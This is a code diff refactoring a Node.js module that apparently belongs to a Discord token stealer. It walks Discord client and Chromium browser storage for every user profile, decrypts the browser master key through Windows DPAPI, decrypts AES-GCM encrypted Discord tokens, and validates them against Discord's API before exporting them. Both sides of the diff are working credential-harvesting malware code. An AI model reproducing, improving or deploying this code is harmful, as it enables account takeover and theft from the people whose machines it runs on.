@@ -1,101 +1,103 @@
 const { 
-    getProfiles,
-    getUsers
-} = require("./../../utils/harware.js");
+    getProfiles 
+} = require("./../../utils/harware/getUsers.js");
 
-const { unprotectData: Aurita } = require("win-dpapi");
-const { Transform } = require("stream");
-const crypto        = require("crypto");
-const axios         = require("axios");
-const path          = require("path");
-const fs            = require("fs");
+const { 
+    Transform
+} = require("stream");
 
-async function validateToken(token) {
+const Aurita = require("win-dpapi");
+
+const crypto = require("crypto");
+const axios = require("axios");
+const path = require("path");
+const fs = require("fs");
+const util = require("util");
+
+const validateToken = async (token) => {
     try {
         const response = await axios.get('https://discord.com/api/v9/users/@me', {
             headers: { Authorization: token }
         });
-        return 200 === response.status;
+        return response.status === 200;
     } catch {
         return false;
     }
-}
+};
 
-async function processFile(filePath, pathTail, TOKENS) {
-    return new Promise((resolve, reject) => {
-        try {
-            const stream = fs.createReadStream(filePath, 'utf8');
-            const transform = new Transform({
-                transform(chunk, encoding, callback) {
-                    const lines = chunk.toString().split('\n');
-                    lines.forEach(line => {
-                        if (filePath.includes("cord")) {
-                            const localStatePath = pathTail.replace("Local Storage", "Local State");
-                            fs.readFile(localStatePath, 'utf8', (err, data) => {
-                                if (err) return;
-                                const localState = JSON.parse(data);
-                                const encrypted = Buffer.from(localState.os_crypt.encrypted_key, 'base64').slice(5);
-                                const key = Aurita(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
-                                const encryptedRegex = /dQw4w9WgXcQ:[^\"]*/;
-                                const match = line.match(encryptedRegex);
+const processFile = async (filePath, pathTail, allTokens) => {
+    try {
+        const localStatePath = pathTail.replace("Local Storage", "Local State");
+        const localStateData = await fs.promises.readFile(localStatePath, 'utf8');
+        const localState = JSON.parse(localStateData);
+        const encrypted = Buffer.from(localState.os_crypt.encrypted_key, 'base64').slice(5);
+        const bufferEncrypted = Buffer.from(encrypted, 'utf-8');
 
-                                if (match) {
-                                    try {
-                                        let token = Buffer.from(match[0].split("dQw4w9WgXcQ:")[1], 'base64');
-                                        const start = token.slice(3, 15);
-                                        const middle = token.slice(15, token.length - 16);
-                                        const end = token.slice(token.length - 16);
+        const key = Aurita.unprotectData(bufferEncrypted, null, 'CurrentUser');
 
-                                        const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
-                                        decipher.setAuthTag(end);
+        const encryptedRegex = /dQw4w9WgXcQ:[^\"]*/;
 
-                                        token = `${decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')}`;
-                                        TOKENS.push(token);
-                                    } catch {
-                                    }
-                                }
-                            });
+        const transform = new Transform({
+            transform(chunk, encoding, callback) {
+                const lines = chunk.toString().split('\n');
+                lines.forEach(line => {
+                    if (filePath.includes("cord")) {
+                        const match = line.match(encryptedRegex);
+
+                        if (match) {
+                            try {
+                                let token = Buffer.from(match[0].split("dQw4w9WgXcQ:")[1], 'base64');
+                                const start = token.slice(3, 15);
+                                const middle = token.slice(15, token.length - 16);
+                                const end = token.slice(token.length - 16);
+
+                                const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
+                                decipher.setAuthTag(end);
+
+                                token = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
+                                allTokens.push(token);
+                            } catch (err) {
+                            }
                         }
-                    });
-                    callback();
-                }
-            });
+                    }
+                });
+                callback();
+            }
+        });
 
-            stream.pipe(transform).on('finish', resolve).on('error', reject);
-        } catch (err) {
-            reject(err);
-        }
-    });
-}
+        const stream = fs.createReadStream(filePath, 'utf8');
+        await new Promise((resolve, reject) => {
+            stream.pipe(transform)
+                .on('finish', resolve)
+                .on('error', reject);
+        });
+    } catch (err) {
+        throw err;
+    }
+};
 
-async function processDirectory(directory, TOKENS) {
+const processDirectory = async (directory, allTokens) => {
     try {
         const fileNames = await fs.promises.readdir(directory);
         const fileProcesses = fileNames
             .filter(fileName => fileName.endsWith('.log') || fileName.endsWith('.ldb'))
             .map(fileName => {
                 const filePath = path.join(directory, fileName);
-                const pathSplit = directory.split(path.sep);
-                const pathSplitTail = directory.includes('Network')
-                    ? pathSplit.slice(0, pathSplit.length - 3)
-                    : pathSplit.slice(0, pathSplit.length - 2);
+                const pathTail = directory.includes('Network')
+                    ? directory.split(path.sep).slice(0, -3).join(path.sep)
+                    : directory.split(path.sep).slice(0, -2).join(path.sep);
 
-                const pathTail = `${pathSplitTail.join(path.sep)}${path.sep}`;
-                return processFile(filePath, pathTail, TOKENS);
+                return processFile(filePath, pathTail, allTokens);
             });
 
         await Promise.all(fileProcesses);
     } catch (err) {
-        return
     }
-}
+};
 
-async function getBrowserProfiles(user) {
-    const LOCALAPPDATA = process.env.LOCALAPPDATA
-        .replace(process.env.USERPROFILE, user);
-
-    const APPDATA      = process.env.APPDATA
-        .replace(process.env.USERPROFILE, user);
+const getBrowserProfiles = async (user) => {
+    const LOCALAPPDATA = process.env.LOCALAPPDATA.replace(process.env.USERPROFILE, user);
+    const APPDATA = process.env.APPDATA.replace(process.env.USERPROFILE, user);
 
     const ChromiumBrowsers = {
         'Google(x86)'  : `${LOCALAPPDATA}\\Google(x86)\\Chrome\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
@@ -137,35 +139,30 @@ async function getBrowserProfiles(user) {
         'Opera GX'     : `${APPDATA}\\Opera Software\\Opera GX Stable\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
     };
 
-    const GeckoBrowsers = {
-
-    };
-
-    const GetChromiumBrowsers = Object.values(ChromiumBrowsers);
-    const GetGeckoBrowsers = Object.values(GeckoBrowsers);
+    const GeckoBrowsers = {};
 
     const BROWSERS_PATH = [
-        ...GetChromiumBrowsers,
-        ...GetGeckoBrowsers
+        ...Object.values(ChromiumBrowsers),
+        ...Object.values(GeckoBrowsers)
     ];
 
     let BROWSERS_PROFILES = [];
 
     for (const browser of BROWSERS_PATH) {
-        const profiles = getProfiles(browser, path.basename(browser));
-        for (const profile of profiles) {
-            BROWSERS_PROFILES.push(profile.path);
+        try {
+            const profiles = getProfiles(browser, path.basename(browser));
+            BROWSERS_PROFILES.push(...profiles.map(profile => profile.path));
+        } catch (err) {
         }
     }
 
     return BROWSERS_PROFILES;
-}
+};
 
-async function discordFindTokens(user) {
-    let TOKENS = [];
+const discordFindTokens = async (user) => {
+    let allTokens = [];
 
-    const APPDATA = process.env.APPDATA
-        .replace(process.env.USERPROFILE, user);
+    const APPDATA = process.env.APPDATA.replace(process.env.USERPROFILE, user);
 
     const DISCORD_PATHS = {
         'Discord Canary' : `${APPDATA}\\discordcanary\\Local Storage\\leveldb\\`,
@@ -175,8 +172,8 @@ async function discordFindTokens(user) {
     };
 
     const pathProcesses = Object.values(DISCORD_PATHS)
-        .filter(async value => fs.promises.access(value).then(() => true).catch(() => false))
-        .map(value => processDirectory(value, TOKENS));
+        .filter(async value => util.promisify(fs.access)(value).then(() => true).catch(() => false))
+        .map(value => processDirectory(value, allTokens));
 
     await Promise.all(pathProcesses);
 
@@ -190,7 +187,7 @@ async function discordFindTokens(user) {
     ];
 
     const browserProcesses = BROWSERS_PROFILES.map(async (profile) => {
-        if (await fs.promises.access(profile).then(() => true).catch(() => false)) {
+        if (await util.promisify(fs.access)(profile).then(() => true).catch(() => false)) {
             const files = await fs.promises.readdir(profile);
             const fileProcesses = files
                 .filter(file => file.endsWith('.log') || file.endsWith('.ldb'))
@@ -198,7 +195,7 @@ async function discordFindTokens(user) {
                     const filePath = path.join(profile, file);
                     return fs.promises.readFile(filePath, 'utf-8').then(content => {
                         for (const reg of cleanRegex) {
-                            TOKENS.push(...content.match(reg) || []);
+                            allTokens.push(...content.match(reg) || []);
                         }
                     });
                 });
@@ -209,13 +206,19 @@ async function discordFindTokens(user) {
 
     await Promise.all(browserProcesses);
 
-    TOKENS = Array.from(new Set(TOKENS));
-    TOKENS = await Promise.all(TOKENS.map(async token => (await validateToken(token)) ? token : null));
-    TOKENS = TOKENS.filter(token => token !== null);
+    const uniqueTokens = Array.from(new Set(allTokens));
 
-    return TOKENS;
-}
+    const validatedTokens = await Promise.all(
+        uniqueTokens.map(async token => (
+            await validateToken(token) ? token : null
+        ))
+    );
+
+    const tokens = validatedTokens.filter(token => token !== null);
+
+    return tokens;
+};
 
 module.exports = {
     discordFindTokens
-}
+};
